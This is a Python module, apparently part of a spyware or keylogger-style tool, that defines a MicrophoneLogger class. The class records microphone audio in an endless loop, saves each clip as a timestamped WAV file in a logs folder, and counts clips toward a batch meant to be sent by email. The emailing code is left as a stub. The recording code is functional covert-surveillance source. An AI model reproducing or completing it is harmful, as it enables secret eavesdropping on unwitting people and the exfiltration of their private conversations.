from sounddevice import rec, wait, stop
from scipy.io.wavfile import write
from datetime import datetime
from os.path import join
from time import sleep
from os import _exit
from config import LOGS_DIRECTORY_PATH, MICROPHONE_INTERVAL, MICROPHONE_RECORDINGS_PER_EMAIL
from utils.tools import log, get_timestamp


class MicrophoneLogger:
    def __init__(self):
        self.freq = 44100
        self.duration = MICROPHONE_INTERVAL
        self.logs_directory_path = (
            "" if not LOGS_DIRECTORY_PATH else LOGS_DIRECTORY_PATH
        )
        self.counter_max = MICROPHONE_RECORDINGS_PER_EMAIL
        self.counter = 0
        self.running = True

    def handle_counter(self):
        if self.counter >= self.counter_max:
            pass # email logic here

    def record(self):
        recording = rec(
            int(self.duration * self.freq),
            samplerate=self.freq,
            channels=1,
            dtype="int16",
        )
        wait()
        write(
            join(self.logs_directory_path, f"microphone_{get_timestamp()}.wav"), self.freq, recording
        )


    def run(self):
        while self.running:
            self.record()
            self.counter += 1
            self.handle_counter()
            sleep(self.duration + 1)

def main():
    microphone_logger = MicrophoneLogger()
    try:
        microphone_logger.run()
    except KeyboardInterrupt:
        microphone_logger.running = False
    except Exception as e:
        microphone_logger.running = False
        pass # Error handling logic here


if __name__ == "__main__":
    _exit(main())